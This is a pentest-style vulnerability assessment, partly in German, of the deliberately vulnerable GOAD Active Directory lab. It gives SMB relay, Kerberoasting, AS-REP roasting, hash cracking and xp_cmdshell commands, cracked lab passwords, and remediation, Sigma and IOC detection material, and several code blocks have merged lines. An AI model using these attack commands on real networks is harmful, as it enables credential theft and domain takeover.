# GOAD-Vulnerability-Assessment

# GOAD Lab - Comprehensive Vulnerability Assessment

## Executive Summary

Diese detaillierte Schwachstellenanalyse basiert auf allen gesammelten Reconnaissance-Daten, Scan-Ergebnissen und erfolgreichen Exploits im GOAD Lab (192.168.20.0/24). Die Bewertung folgt dem CVSS 3.1-Standard und priorisiert kritische Sicherheitslücken für sofortige Remediation.

---

## 1. Critical Vulnerabilities (CVSS 9.0-10.0)

### 1.1 SMB Signing Completely Disabled - BRAAVOS (192.168.20.23)

**CVSS Score:** 9.1 (Critical)
**Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

**Technical Details:**

```
Host: braavos.essos.local (192.168.20.23)
Service: SMB (Port 445)
Configuration: message_signing: disabled (dangerous, but default)
Guest Access: account_used: guest
```

**Exploitation:**
- SMB Relay attacks via ntlmrelayx
- NTLM hash capture via Responder
- Lateral movement ohne Authentifizierung
- Credential harvesting from network traffic

**Proof of Concept:**

```bash
# SMB Relay Attackecho "192.168.20.23" > targets.txt
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell.exe -enc <payload>"# Responder für Hash Captureresponder -I eth0 -rdwv
```

**Impact:**
- Complete system compromise
- Domain credential exposure
- Lateral movement to other systems
- Data exfiltration capabilities

**Remediation:**

```powershell
# Sofortige SMB-Härtung via Group PolicySet-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters" -Name "RequireSecuritySignature" -Value 1Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\lanmanworkstation\parameters" -Name "RequireSecuritySignature" -Value 1
```

### 1.2 Kerberoasting Vulnerable Service Accounts

**CVSS Score:** 9.0 (Critical)

**Vector:** AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

**Vulnerable Accounts:**

```
jon.snow (CIFS/thewall.north.sevenkingdoms.local)
├── Password: iknownothing (CRACKED via rockyou.txt)
├── Delegation: constrained
└── Group Membership: Night Watch, Domain-level privileges

sansa.stark (HTTP/eyrie.north.sevenkingdoms.local)
├── Password: [CRACKING IN PROGRESS]
├── Delegation: None
└── Group Membership: Stark family

sql_svc (MSSQLSvc/castelblack.north.sevenkingdoms.local:1433)
├── Password: [CRACKING IN PROGRESS]
├── Last Logon: 2025-04-13 19:12:10
└── High-privilege SQL service account
```

**Exploitation Steps:**

```bash
# 1. SPN ExtractionGetUserSPNs.py north.sevenkingdoms.local/hodor:hodor -dc-ip 192.168.20.11 -outputfile kerberoast.txt
# 2. Hash Crackingjohn --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
hashcat -m 13100 kerberoast.txt rockyou.txt
# 3. Credential Validationcrackmapexec smb 192.168.20.0/24 -u jon.snow -p iknownothing
```

**Impact:**
- Immediate domain access
- Service account privilege escalation
- Constrained delegation exploitation potential
- SQL Server administrative access

### 1.3 AS-REP Roasting - Pre-Authentication Disabled

**CVSS Score:** 8.8 (High)
**Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**Vulnerable Account:**

```
brandon.stark@NORTH.SEVENKINGDOMS.LOCAL
├── Password: iseedeadpeople (CRACKED via Hashcat)
├── Pre-Auth: DISABLED
├── Kerberos Ticket: $krb5asrep$23$brandon.stark@NORTH...
└── Account Status: Active, no lockout policy
```

**Exploitation:**

```bash
# AS-REP Roasting AttackGetNPUsers.py north.sevenkingdoms.local/ -dc-ip 192.168.20.11 -usersfile users.txt -outputfile asrep_hashes.txt
# Hashcat Crackinghashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 2. High Risk Vulnerabilities (CVSS 7.0-8.9)

### 2.1 HTTP TRACE Method Enabled

**CVSS Score:** 8.2 (High)
**Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N

**Affected Hosts:**
- KINGSLANDING (192.168.20.10:80)
- CASTELBLACK (192.168.20.22:80)

- BRAAVOS (192.168.20.23:80)

**Technical Evidence:**

```
http-methods: Potentially risky methods: TRACE
Server: Microsoft-IIS/10.0
```

**Exploitation:**

```bash
# Cross-Site Tracing (XST) Attackcurl -X TRACE http://192.168.20.10/
curl -X TRACE http://192.168.20.22/ -H "Cookie: session=sensitive_data"curl -X TRACE http://192.168.20.23/ -H "Authorization: Bearer token"
```

**Impact:**
- Session hijacking via XST
- Cookie/header disclosure
- Authentication bypass potential
- Client-side attack vectors

**Remediation:**

```xml
<!-- IIS applicationHost.config --><system.webServer>
  <security>
    <requestFiltering>
      <verbs applyToWebDAV="false">
        <add verb="TRACE" allowed="false" />
        <add verb="TRACK" allowed="false" />
      </verbs>
    </requestFiltering>
  </security>
</system.webServer>
```

### 2.2 SMB Signing Optional - CASTELBLACK

**CVSS Score:** 7.8 (High)
**Vector:** AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**Technical Details:**

```
Host: castelblack.north.sevenkingdoms.local (192.168.20.22)
SMB Security: Message signing enabled but not required
SQL Server: Microsoft SQL Server 2019 (Port 1433)
```

**Exploitation Scenario:**
- SMB Relay attacks during authentication
- Man-in-the-middle attacks on SMB traffic
- SQL Server credential interception

### 2.3 Self-Signed Certificates

**CVSS Score:** 7.4 (High)
**Vector:** AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N

**Affected Services:**

```
SQL Server TLS (192.168.20.22, 192.168.20.23):
├── Subject: commonName=SSL_Self_Signed_Fallback
├── Valid From: 2025-08-13T14:05:10
├── Valid To: 2055-08-13T14:05:10
└── Risk: Man-in-the-Middle attacks

WinRM HTTPS (All Windows Hosts):
├── Subject: commonName=VAGRANT-2019
├── Alternative Names: DNS:VAGRANT-2019, DNS:vagrant-2019
├── Valid From: 2024-06-12T06:56:50
├── Valid To: 2027-06-12T06:56:50
└── Risk: Known private keys (Vagrant default)
```

---

## 3. Medium Risk Vulnerabilities (CVSS 4.0-6.9)

### 3.1 Anonymous LDAP Binding

**CVSS Score:** 6.5 (Medium)
**Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

**Affected Domain Controllers:**
- KINGSLANDING (192.168.20.10:389)
- WINTERFELL (192.168.20.11:389)
- MEEREEN (192.168.20.12:389)

**Information Disclosed:**

```bash
# Anonymous LDAP Enumeration Resultsldapsearch -x -H ldap://192.168.20.10 -s base
# Available Naming Contexts:DC=sevenkingdoms,DC=local
CN=Configuration,DC=sevenkingdoms,DC=local
CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local
DC=DomainDnsZones,DC=sevenkingdoms,DC=local
DC=ForestDnsZones,DC=sevenkingdoms,DC=local
```

**Impact:**
- Domain structure reconnaissance
- User enumeration foundation
- Attack surface mapping
- Trust relationship discovery

### 3.2 Guest Account Enabled

**CVSS Score:** 5.3 (Medium)
**Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

**Affected Hosts:**
- MEEREEN (192.168.20.12): `account_used: guest`
- BRAAVOS (192.168.20.23): Guest SMB access enabled

### 3.3 Time Synchronization Issues

**CVSS Score:** 4.3 (Medium)
**Vector:** AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N

**Clock Skew Analysis:**

```
KINGSLANDING (192.168.20.10): -3s deviation
WINTERFELL (192.168.20.11): -5s deviation
MEEREEN (192.168.20.12): -13m22s deviation (significant)
CASTELBLACK (192.168.20.22): -3s deviation
BRAAVOS (192.168.20.23): -19m59s deviation (critical)
```

**Impact:**
- Kerberos authentication issues
- Ticket replay attack windows
- Event log correlation problems

---

## 4. Nuclei Scan Results Analysis

### 4.1 High/Critical CVE Findings

**Mass CVE Detection (Likely False Positives):**

```
[CVE-2015-9323] [critical] 192.168.20.11, 192.168.20.12
[CVE-2016-10033] [critical] 192.168.20.11, 192.168.20.12
[CVE-2018-2894] [critical] 192.168.20.11, 192.168.20.12
[CVE-2021-44228] [critical] Multiple hosts (Log4Shell)
```

**Analysis:** Die meisten Nuclei-Findings sind False Positives da:
- CVEs sind hauptsächlich für Linux/Apache/PHP-Anwendungen
- GOAD verwendet Windows/IIS-Stack
- Nuclei-Templates erkennen Windows-Umgebung nicht korrekt

**Legitimate Concerns:**
- Log4Shell (CVE-2021-44228) könnte in Java-Anwendungen vorhanden sein
- IIS-spezifische Schwachstellen nicht durch Standard-Templates abgedeckt

### 4.2 Custom Nuclei Templates für GOAD

**Empfohlene Custom Templates:**

```yaml
# goad-smb-signing.yamlid: goad-smb-signing-disabledinfo:  name: SMB Signing Disabled Detection  severity: critical  tags: goad,smb,networknetwork:  - inputs:      - data: "\x00\x00\x00\x54\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"    host: ["{{Hostname}}"]    port: 445    matchers:      - type: word        words:          - "message_signing: disabled"
```

---

## 5. Active Directory Security Assessment

### 5.1 Domain Trust Analysis

**Identified Trust Relationships:**

```
Forest Structure:
├── sevenkingdoms.local (Root Forest)
│   └── north.sevenkingdoms.local (Child Domain)
│       └── castelblack.north.sevenkingdoms.local (Member Server)
└── essos.local (Separate Forest)
    └── braavos.essos.local (Member Server)
```

**Trust Security Implications:**
- **Parent-Child Trust**: Potential SID History injection attacks
- **Cross-Forest Trust**: Enterprise Admin escalation paths
- **SQL Service Accounts**: Cross-domain database access

### 5.2 Privilege Escalation Paths

**BloodHound Analysis Required for:**

```
// Domain Admin Paths
MATCH p=shortestPath((u:User {name:"JON.SNOW@NORTH.SEVENKINGDOMS.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@NORTH.SEVENKINGDOMS.LOCAL"})) RETURN p

// Cross-Domain Privileges
MATCH (u:User)-[:MemberOf*1..]->(g:Group) WHERE g.domain <> u.domain RETURN u.name, g.name

// Service Account Delegation
MATCH (u:User) WHERE u.unconstraineddelegation=true OR u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate
```

### 5.3 Group Policy Security

**Discovered GPO:**

```
Container: {EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D}
Name: StarkWallpaper
Location: SYSVOL\north.sevenkingdoms.local\Policies\
Scripts: script.ps1 (165 bytes), secret.ps1 (869 bytes)
```

**GPO Security Risks:**
- Credential exposure in SYSVOL scripts
- Logon/startup script injection possibilities
- Group Policy hijacking for persistence

---

## 6. SQL Server Security Assessment

### 6.1 Database Configuration Analysis

**SQL Server Instances:**

```
CASTELBLACK (192.168.20.22:1433):
├── Version: Microsoft SQL Server 2019 RTM (15.00.2000.00)
├── Service Account: sql_svc (Domain Account)
├── Certificate: SSL_Self_Signed_Fallback
├── Network Access: Unrestricted (Port 1433 exposed)
└── Authentication: Windows Authentication + SQL Server

BRAAVOS (192.168.20.23:1433):
├── Version: Microsoft SQL Server 2019 RTM (15.00.2000.00)
├── Service Account: Unknown (likely sql_svc)
├── Certificate: SSL_Self_Signed_Fallback
├── Network Access: Unrestricted (Port 1433 exposed)
└── Authentication: Windows Authentication + SQL Server
```

### 6.2 SQL Server Attack Vectors

**High-Priority Targets:**
1. **xp_cmdshell** - Command execution if enabled
2. **SQL Service Account** - Domain credentials via Kerberoasting
3. **Linked Servers** - Potential trust relationships
4. **SQL Agent Jobs** - Persistence mechanism

**Recommended Exploitation:**

```sql
-- Test for xp_cmdshellEXEC xp_cmdshell 'whoami';
-- Enable xp_cmdshell if disabledEXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-- SQL Server version and permissionsSELECT @@VERSION;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

---

## 7. Network Security Assessment

### 7.1 pfSense Firewall Analysis

**Firewall Configuration (192.168.20.1):**

```
Services:
├── DNS (53/tcp) - Unbound DNS Server
├── HTTP (80/tcp) - Redirect to HTTPS
├── HTTPS (443/tcp) - pfSense Web GUI
└── Certificate: vpn.goad.lab (Valid until 2034)

Security Concerns:
├── Default pfSense configuration likely
├── Web GUI exposed on standard port
├── Potential for firewall rule bypass
└── VPN certificate suggests VPN functionality
```

**Recommended Testing:**
- Default credential testing (admin/pfsense)
- Web GUI vulnerability scanning
- Network rule enumeration
- VPN configuration analysis

### 7.2 Network Segmentation Analysis

**Current Segmentation:**
- **No VLAN separation** - All hosts in single broadcast domain
- **Open inter-host communication** - No micro-segmentation
- **Exposed SQL Services** - Database ports accessible network-wide
- **RDP Exposure** - Remote Desktop on all Windows hosts

**Security Impact:**
- Lateral movement without restrictions
- Broadcast attack vectors (LLMNR, NBT-NS)
- Service enumeration trivial
- No containment for compromised hosts

---

## 8. Remediation Roadmap

### 8.1 Critical Priority (0-7 days)

**Immediate Actions:**

```powershell
# 1. SMB Signing enforcementSet-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters" -Name "RequireSecuritySignature" -Value 1# 2. HTTP TRACE disabled# Via IIS Manager or web.config# 3. Guest account disablednet user guest /active:no
# 4. Anonymous LDAP binding restricted# Via AD Administrative Center: dsHeuristics modification
```

### 8.2 High Priority (7-30 days)

**Certificate Management:**
- Deploy Enterprise CA
- Replace all self-signed certificates
- Implement certificate auto-enrollment

**Service Account Hardening:**
- Implement Managed Service Accounts (gMSA)
- Service account password rotation
- Principle of least privilege

**Network Segmentation:**

```
Proposed VLAN Structure:
├── VLAN 10: Domain Controllers (192.168.20.10-12)
├── VLAN 20: SQL Servers (192.168.20.22-23)
├── VLAN 30: Management (pfSense, monitoring)
└── Firewall Rules: Strict inter-VLAN communication
```

### 8.3 Medium Priority (30-90 days)

**Advanced Monitoring:**
- Deploy SIEM solution (Splunk, ELK, Sentinel)
- Enable PowerShell logging
- Advanced Threat Protection (ATP)
- Network traffic analysis

**Privileged Access Management:**
- Implement Just-In-Time (JIT) access
- Privileged workstation deployment
- Credential Guard activation
- LAPS implementation

---

## 9. Detection & Monitoring

### 9.1 Key Indicators of Compromise (IOCs)

**Kerberos Attacks:**

```
Event IDs: 4768, 4769, 4771
Indicators:
├── Unusual TGS requests from service accounts
├── AS-REP requests for accounts without pre-auth
├── Multiple failed Kerberos authentications
└── Ticket requests for non-existent services
```

**SMB Attacks:**

```
Event IDs: 4624, 4625, 4648
Indicators:
├── SMB connections without signing
├── NTLM authentication from unusual sources
├── Lateral movement patterns (Type 3 logons)
└── Access to ADMIN$ or C$ shares
```

**PowerShell Activity:**

```
Event IDs: 4103, 4104, 4105, 4106
Indicators:
├── Encoded PowerShell commands (-enc parameter)
├── Downloads from external sources (IEX, DownloadString)
├── Invoke-Expression with suspicious content
└── PowerShell execution from unusual processes
```

### 9.2 SIEM Detection Rules

**Sigma Rules for GOAD-specific Attacks:**

```yaml
title: Kerberoasting Attack Detectionstatus: experimentallogsource:  product: windows  service: securitydetection:  selection:    EventID: 4769    ServiceName:      - 'krbtgt'      - '*$'    TicketOptions: '0x40810000'  condition: selectionfalsepositives:  - Legitimate service accesslevel: high
```

---

## 10. Compliance & Risk Analysis

### 10.1 Regulatory Impact Assessment

**GDPR Implications:**
- AD contains personal identifiable information (PII)
- Breach notification requirements within 72 hours
- Data subject access requests complications

**PCI-DSS Considerations:**
- If SQL databases contain cardholder data
- Network segmentation requirements (Requirement 1)
- Strong access controls (Requirement 7)

**SOX Compliance:**
- Financial data integrity concerns
- Audit trail requirements
- Control deficiency reporting

### 10.2 Business Risk Quantification

**High-Level Risk Metrics:**

```
Data at Risk:
├── User Credentials: ~50+ domain accounts exposed
├── Service Accounts: Critical SQL/AD service credentials
├── Configuration Data: GPO scripts, system configurations
└── Database Content: Potential business-critical data

Downtime Risk:
├── Domain Controller compromise: 100% AD outage
├── SQL Server compromise: Database service interruption
├── Lateral spread: Potential for complete infrastructure compromise
└── Recovery Time: 24-72 hours for complete rebuild

Financial Impact:
├── Direct Costs: Incident response, forensics, rebuilding
├── Indirect Costs: Business interruption, reputation damage
├── Regulatory Fines: GDPR (up to 4% annual revenue)
└── Legal Liability: Data breach lawsuits, compliance violations
```

---

## Conclusion

Das GOAD Lab präsentiert eine **kritische Sicherheitslage** mit mehreren direkt exploitbaren Schwachstellen. Die Kombination aus deaktivierter SMB-Signierung, schwachen Kerberos-Konfigurationen und fehlender Netzwerksegmentierung ermöglicht eine vollständige Kompromittierung innerhalb weniger Stunden.

**Sofortiger Handlungsbedarf** besteht bei:
1. SMB-Signierung-Enforcement auf BRAAVOS und CASTELBLACK
2. Kerberos-Härtung (Pre-Authentication, Service Account Passwords)
3. HTTP TRACE-Deaktivierung auf allen IIS-Servern
4. Netzwerksegmentierung zwischen kritischen Services

**Langfristige Sicherheitsverbesserungen** sollten eine **Zero Trust-Architektur** mit starker Authentifizierung, kontinuierlichem Monitoring und privileged access management umfassen.

---

**Vulnerability Assessment Score: 8.5/10 (Critical)**

**Recommended Action: Immediate remediation required**

**Assessment Date:** 27. August 2025

**Next Review:** 30 Tage nach Remediation